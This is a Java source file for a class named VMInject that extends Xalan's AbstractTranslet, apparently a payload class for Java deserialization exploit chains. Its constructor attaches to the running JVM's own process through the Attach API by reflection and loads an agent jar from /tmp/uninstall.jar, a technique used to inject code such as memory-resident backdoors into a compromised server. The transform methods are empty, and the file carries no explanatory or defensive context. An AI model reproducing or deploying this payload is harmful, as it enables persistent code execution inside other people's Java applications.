import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public class VMInject extends AbstractTranslet {

    public VMInject(){
        try {
            URL url1 = new URL("file:///usr/local/openjdk-8/lib/tools.jar");
            URLClassLoader classLoader = new URLClassLoader(new URL[] { url1 }, Thread.currentThread().getContextClassLoader());
            String pid = java.lang.management.ManagementFactory.getRuntimeMXBean().getName().split("@")[0];
            System.out.println("PID" + pid);
            String payload = "/tmp/uninstall.jar";
            Class virtualMachineClass = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Method attach = virtualMachineClass.getDeclaredMethod("attach", String.class);
            attach.setAccessible(true);
            Object virtualMachine = attach.invoke(null, pid);
            System.out.println("attach success");

            Method loadAgent = virtualMachine.getClass().getMethod("loadAgent", String.class);
            loadAgent.setAccessible(true);
            loadAgent.invoke(virtualMachine, payload);
            System.out.println("loadAgent success");

            Method detach = virtualMachine.getClass().getMethod("detach");
            detach.setAccessible(true);
            detach.invoke(virtualMachine);
            System.out.println("detach success");

        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
